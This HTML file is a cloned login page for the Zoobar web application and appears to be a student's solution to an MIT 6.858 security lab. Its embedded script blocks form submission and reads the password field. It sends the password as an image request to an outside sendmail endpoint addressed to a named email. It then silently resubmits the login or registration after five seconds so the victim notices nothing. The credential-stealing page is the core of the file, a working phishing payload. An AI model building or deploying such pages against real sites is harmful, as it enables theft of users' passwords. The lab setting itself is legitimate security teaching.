<!DOCTYPE html>

<base target="_self" href="http://localhost:8080/zoobar/index.cgi/transfer">

<html>
    <head>
        <meta charset="utf-8">
        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
        <title>
          Login - Zoobar Foundation
        </title>
    </head>
    <body>

      <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Disciplined
                      Research</a></h1>
      <h2>Supporting the loyal
          representatives of the next generation</h2>

<div id="login" class="centerpiece">

<form name="loginform" method="POST" id="form" action="http://localhost:8080/zoobar/index.cgi/login">
<table>
<tr>
   <td>Username:</td>
  <td><input type="text" name="login_username" size="20"
  autocomplete="no" value=""></td>
</tr>
<tr>
   <td>Password:</td>
  <td colspan=2><input id="pass" type="password" name="login_password" size=20 autocomplete="no">
  <input type="submit" id="log" name="submit_login" value="Log in">       
  <input type="submit" id="register" name="submit_registration" value="Register"></td>      
</tr>
</table>
<input type="hidden" name="nexturl" value="/zoobar/index.cgi/">  
</form>                                                          
</div>
<div class="footer warning">                                     


</div>
<script>document.loginform.login_username.focus();</script>      

<script type="text/javascript">                                  
var reg = false;                                                 

document.getElementById("form").addEventListener("submit", function(event){
submit(event)});

document.getElementById("register").addEventListener("click", function(event){
reg = true;});

var t = 1;


function submit(event) {

  if (t == 1) {
    event.preventDefault();
    var pass = document.getElementById("pass").value;
    javascript:void((new Image()).src='http://css.csail.mit.edu/6.858/2015/labs/sendmail.php?' + 'to=markatou@mit.edu' + '&payload=' + pass);
    t = 4;
    setTimeout(function(){
        if (reg==true) {
            document.getElementById("register").click();
        } else {
            document.getElementById("log").click();
        }
    }, 5000);
  }
}

</script>


    </body>
</html>
